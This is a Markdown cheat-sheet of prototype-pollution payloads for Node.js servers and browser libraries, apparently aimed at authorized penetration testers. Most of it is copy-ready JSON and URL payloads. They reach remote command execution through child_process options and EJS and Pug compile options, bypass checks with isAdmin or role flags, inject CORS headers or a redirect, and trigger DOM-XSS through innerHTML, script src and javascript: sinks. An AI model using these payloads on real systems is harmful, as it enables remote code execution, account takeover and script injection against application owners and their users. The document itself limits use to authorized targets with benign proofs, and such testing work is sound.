# Prototype Pollution — gadget cheat-sheet (authorized only)

**Source + Gadget = Impact.** The source pollutes `Object.prototype`; a gadget reads an undeclared property into a sink.
Match the gadget to the target's ACTUAL dependencies — firing an EJS gadget on a Pug app does nothing. Prove global
pollution first (SSPP oracle / fresh object), then trigger the gadget with **one benign** proof.

---

## Server-side → RCE

### child_process (spawn/exec/execFile/fork options fall through to the prototype)
```jsonc
// pollute NODE_OPTIONS so the next spawned Node process requires your file (pair with FileUpload / /proc):
{"__proto__":{"NODE_OPTIONS":"--require=/tmp/x.js"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require=/proc/self/fd/... "},"argv0":"node"}}
// shell option gadget (when spawn uses {shell:...} built fresh):
{"__proto__":{"shell":"node","argv0":"console.log(require('child_process').execSync('id')+'')//"}}
```
Trigger: any subsequent `child_process.*` call in the app.

### EJS (compile options read off a plain object)
```jsonc
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
{"__proto__":{"escapeFunction":"1;return global.process.mainModule.require('child_process').execSync('id')","client":true,"compileDebug":true}}
{"__proto__":{"localsName":"x;process.mainModule.require('child_process').execSync('id');//x"}}
```
Trigger: the next `res.render(...)` / EJS compile.

### Pug / Jade
```jsonc
{"__proto__":{"compileDebug":true,"self":true,"line":"process.mainModule.require('child_process').execSync('id')"}}
```

### Other engines / libs (see PortSwigger server-side PP gadget catalog for exact keys)
```
Handlebars, Nunjucks, doT, lodash.template   -> engine-specific compile options
nodemailer (sendmail transport path), ansi-html, undici/proxy baseUrl, vm2 escape, require-cache
```

---

## Server-side → auth bypass / logic (no gadget needed)
```jsonc
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"isAuthenticated":true,"verified":true,"premium":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```
Works when the app does `if (obj.isAdmin)` on an object that lacks its OWN `isAdmin`.

---

## Server-side → property injection (no RCE)
```jsonc
{"__proto__":{"exposedHeaders":["secret-header"]}}   // CORS -> ../CORS/
{"__proto__":{"status":302,"location":"https://evil"}} // redirect (engine-dependent)
{"__proto__":{"json spaces":10}}                       // detection oracle (benign)
```

---

## Client-side → DOM-XSS (pollute a config prop a library reads into a sink)
```
?__proto__[src]=data:,alert(document.domain)              // -> script.src / img.src
?__proto__[html]=<img src=x onerror=alert(document.domain)>   // -> innerHTML
?__proto__[srcdoc]=<script>alert(document.domain)</script>    // -> iframe.srcdoc
?__proto__[url]=javascript:alert(document.domain)             // -> location / a.href
?__proto__[template]=<img src=x onerror=alert(1)>
?__proto__[data]=...  ?__proto__[content]=...  ?__proto__[value]=...
```
Libraries with documented gadgets: **jQuery** (`$.extend`, `htmlPrefilter`, `$(html)`), **Google Analytics/gtag**,
**Segment analytics.js**, **Closure**, **Wistia**, **Adobe DTM/Launch**, **sanitize-html / DOMPurify configs**,
**Knockout**. Enumerate loaded scripts, then use the matching gadget (or let **DOM Invader** find the source->sink pair).

---

## Sink reference (what a polluted value must reach)
```
RCE  : child_process options · template compile options · require path
XSS  : innerHTML/outerHTML · script.src · iframe.src/srcdoc · eval/Function/setTimeout(str) · location/href
authz: obj.isAdmin/role/isAuthenticated read on a non-owning object
inj  : CORS headers · redirect location · cache headers
```

> Prove GLOBAL pollution first, match the gadget to real deps, fire ONE benign proof (`id`/OOB/`alert(document.domain)`),
> then STOP. Server pollution persists until restart - flag it. No prod DoS. Authorized targets only.
